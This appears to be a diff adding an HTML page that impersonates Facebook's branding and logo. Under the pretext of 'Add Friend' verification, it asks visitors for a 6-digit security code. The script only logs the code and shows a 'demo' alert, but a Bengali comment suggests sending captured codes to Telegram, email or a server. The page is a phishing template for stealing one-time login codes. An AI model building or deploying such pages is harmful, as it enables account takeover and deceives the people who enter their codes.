@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook – Add Friend Verification</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;500;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      padding: 40px 32px;
+      text-align: center;
+    }
+    .fb-logo {
+      width: 60px;
+      height: 60px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: bold;
+      color: #1c1e21;
+      margin: 0 0 12px;
+    }
+    p {
+      color: #606770;
+      font-size: 15px;
+      line-height: 1.4;
+      margin: 0 0 28px;
+    }
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+    .code-box {
+      width: 48px;
+      height: 56px;
+      border: 2px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 32px;
+      font-weight: bold;
+      text-align: center;
+      line-height: 52px;
+      transition: border-color 0.2s;
+    }
+    .code-box:focus {
+      border-color: #1877f2;
+      outline: none;
+    }
+    .code-box.filled {
+      border-color: #1877f2;
+    }
+    button {
+      background-color: #1877f2;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      padding: 12px 0;
+      border: none;
+      border-radius: 6px;
+      width: 100%;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background-color: #166fe5;
+    }
+    .back-link {
+      display: block;
+      margin-top: 24px;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+    }
+    .back-link:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img 
+      src="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico" 
+      alt="Facebook" 
+      class="fb-logo"
+    />
+
+    <h1>Enter the 6-digit Add code number.</h1>
+
+    <p>
+      This helps us keep your account secure by verifying that it's really you.
+    </p>
+
+    <div class="code-inputs" id="codeInputs">
+      <input type="text" maxlength="1" class="code-box" autofocus />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+      <input type="text" maxlength="1" class="code-box" />
+    </div>
+
+    <button id="submitBtn">Add Friend</button>
+
+    <a href="#" class="back-link">← Return to login</a>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll('.code-box');
+    const submitBtn = document.getElementById('submitBtn');
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        const value = e.target.value;
+        if (value.length === 1) {
+          input.classList.add('filled');
+          if (index < inputs.length - 1) {
+            inputs[index + 1].focus();
+          }
+        } else {
+          input.classList.remove('filled');
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData('text');
+        const digits = pasted.replace(/\D/g, '').slice(0, 6);
+        
+        digits.split('').forEach((digit, i) => {
+          if (index + i < inputs.length) {
+            inputs[index + i].value = digit;
+            inputs[index + i].classList.add('filled');
+          }
+        });
+
+        // Focus last filled or next empty
+        const nextEmpty = Array.from(inputs).findIndex(inp => !inp.value);
+        if (nextEmpty !== -1) {
+          inputs[nextEmpty].focus();
+        }
+      });
+    });
+
+    submitBtn.addEventListener('click', () => {
+      const code = Array.from(inputs).map(i => i.value).join('');
+      if (code.length === 6) {
+        submitBtn.textContent = "Verifying...";
+        submitBtn.disabled = true;
+
+        // এখানে তুমি চাইলে Telegram / email / server এ কোড পাঠাতে পারো
+        // উদাহরণ (শুধু টেস্টের জন্য):
+        console.log("Entered code:", code);
+
+        // বাস্তবে যদি টেস্ট করো → alert দিয়ে দেখাও
+        setTimeout(() => {
+          alert("Code submitted: " + code + "\n(This is just a demo page)");
+          submitBtn.textContent = "Add Friend";
+          submitBtn.disabled = false;
+        }, 1500);
+      } else {
+        alert("Please enter full 6-digit code");
+      }
+    });
+  </script>
+
+</body>
+</html>
